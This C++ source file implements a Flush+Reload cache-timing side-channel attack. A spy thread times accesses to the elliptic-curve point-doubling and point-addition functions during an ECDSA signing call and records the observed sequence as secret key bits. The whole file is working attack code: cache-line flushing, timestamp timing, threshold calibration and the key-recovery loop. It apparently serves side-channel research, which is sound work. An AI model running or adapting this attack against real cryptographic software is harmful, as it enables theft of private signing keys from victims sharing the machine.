#include"spy.h"
void* addr_Pmul = (void*)&EllPoint::MulP;
void* addr_Padd = (void*)&EllPoint::Add;
void* addr_Pdoub = (void*)&EllPoint::Pdouble;
SPY::SPY()
{
    flush_reload_threshold = get_FlushReload_time();
}
SPY::~SPY(){}
inline void SPY::maceess(void* addr)
{
	asm volatile("mfence");
	asm volatile("movl (%0),%%eax \n" : :"c"(addr):"%eax");
	asm volatile("mfence");
}
inline void SPY::flush(void* addr)
{
	asm volatile("mfence");
	asm volatile("clflush 0(%0) \n" : :"c"(addr));
	asm volatile("mfence");

}
inline unsigned long long int SPY::rdtsc()
{
	unsigned long long int a=0;
	asm volatile("mfence");
	asm volatile("rdtsc" : "=A"(a));
	asm volatile("mfence");
	return a;
}
unsigned long long int SPY::get_FlushReload_time()
{
	unsigned long long int start,end,reload_time,flush_time;
	reload_time=0;
	flush_time=0;
	int a[16];
	void* addr=(void*)a;
	unsigned long long int count =10000;
	maceess(addr);
	for(int i=0;i<count;i++)
	{
		start = rdtsc();
		maceess(addr);
		end = rdtsc();
		reload_time +=(end - start);
	}
	for(int i=0;i<count;i++)
	{
		flush(addr);
		start = rdtsc();
		maceess(addr);
		end = rdtsc();
		flush_time +=(end - start);
	}
    flush(addr);
	reload_time /=count;
	flush_time/=count;
	printf("reload:%llu,flush:%llu\n",reload_time,flush_time);
	return (reload_time+flush_time)/2;
}
bool SPY::flush_reload(void* addr)
{
    unsigned long long int start,end;
        start = rdtsc();
		maceess(addr);
		end = rdtsc();

        flush(addr);
        //printf("%llu\n",end-start);
        if((end-start)<flush_reload_threshold)
        {
            return 1;
        }
        return 0;
}


SPY spy;
char key[512];
void* spyth(void* arg)
{
//	while(!Stop_spy)
//	{
		while(!spy.flush_reload(addr_Pmul))
		{
			spy.flush(addr_Pmul);
		}
		int i = 1;
		key[0] = 9;
		while(!Stop_spy)
		{
			if(spy.flush_reload(addr_Pdoub))
			{
				if(spy.flush_reload(addr_Padd))
				{
					key[i]=1;
				}
				else
				{
					key[i]=0;
				}
				i++;
			}
			spy.flush(addr_Padd);
			spy.flush(addr_Pdoub);
			if(i>500){break;}
		}
		key[i]=2;
//	}
}
void Spytest()
{
	pthread_t spy_thread; 
	SignGen sign;
	
	pthread_create(&spy_thread,NULL,spyth, NULL);
	
	sign.Ecdsa_sign_gen("insada");
	Stop_spy =1;
//	pthread_exit(NULL);
	int i=0;
	while(key[i]!=2&&i<500)
	{
		printf("%d",key[i]);
		i++;
	}
		printf("\n%d\n",i);
	spy.flush(addr_Pdoub);
	spy.flush(addr_Padd);
}
/*
unsigned long probe_time(void* addr)
{
	volatile unsigned long time;
	volatile unsigned long* time1;
	asm __volatile__ (
		"mfence      \n"
		"lfence      \n"
		"rdtsc       \n"
		"lfence      \n"
		"movl %%eax , %1 \n"
		"movl (%2) ,  %%eax \n"
		"lfence      \n"
		"rdtsc       \n"
		//"subl %%esi %%eax \n"
		"clflush 0(%2)  \n"
		: "=a" (time) ,"=r"(time1)
		: "r" (addr)
		: "%edx" 
	);
	return time - *time1;// & 0x00000000ffffffff);//-(unsigned long)time1;
}
unsigned long long rdtsca()
{
	unsigned long a,d;
	asm __volatile__ ("mfence");
	asm __volatile__ ("rdtsc" : "=a" (a) ,"=d"(d));
	a = (d<<32)|a;
	asm __volatile__ ("mfence");
	return a;
}
*/
